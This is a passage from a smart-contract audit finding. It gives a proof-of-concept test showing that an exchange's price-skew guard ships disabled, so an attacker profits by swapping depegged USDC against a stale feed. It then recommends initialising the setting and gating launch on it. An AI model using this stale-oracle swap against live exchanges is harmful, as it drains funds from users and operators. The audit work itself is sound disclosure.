POC
function test_POC_F4_skewGuardShipsDisabledAndPermitsMaxSkewSwap() public {
  assertEq(exchange.maxPriceSkew(), 0, ""initialize never assigns maxPriceSkew"");
​
  // A depeg. USDC is really worth $0.90 now, but its feed last printed the peg exactly
  // priceUpdateTimeout ago. The gold feed is current. Both pass their own freshness checks.
  uint256 realUsdcValue = 90e16;                  // $0.90
  goldOracle.set(GOLD_USD, block.timestamp, true);
  usdcOracle.set(PEG_USD, block.timestamp - DEPLOY_TIMEOUT, true);
​
  (,,,, bool healthy) = exchange.getQuoteStableToTroy(address(usdc), 100_000e6);
  assertTrue(healthy, ""HARM: a maximally skewed feed pair quotes as healthy"");
​
  uint256 stableIn = 100_000e6;                   // 100,000 USDC
  vm.prank(attacker);
  uint256 troyOut = exchange.exchangeStableToTroy(address(usdc), stableIn, 0);
​
  // Paid vs received, both valued at the REAL usdc price.
  uint256 paidUsd18     = (uint256(stableIn) * 1e12 * realUsdcValue) / 1e18;
  uint256 receivedUsd18 = (troyOut * GOLD_USD) / 1e18;
  uint256 profitUsd18   = receivedUsd18 - paidUsd18;
  uint256 feeUsd18      = (paidUsd18 * DEPLOY_FEE_BPS) / 10_000;
​
  assertGt(receivedUsd18, paidUsd18, ""HARM: attacker receives more value than paid"");
  assertGt(profitUsd18, feeUsd18 * 10, ""HARM: extraction dwarfs the fee"");
}
The control test proves the safeguard works and just needs switching on. With the limit set to 10
minutes, the identical swap is rejected with PriceSkew .
Recommendation
Add the setting to the deployment config and assign it at startup, requiring a non-zero value inside the
allowed range:
  priceUpdateTimeout = config.priceUpdateTimeout;
+ maxPriceSkew = config.maxPriceSkew;   // add to InitConfig; require non-zero and <= 
MAX_PRICE_SKEW_LIMIT
+ emit MaxPriceSkewSet(0, config.maxPriceSkew);
Tune it to the slower of the two feeds. Too tight and legitimate trades get rejected.
Also add it as a hard requirement in the go live checklist script, so trading cannot open while the switch
is off. That script already gates on oracle health, reserves and compliance, and this belongs in the same
list.
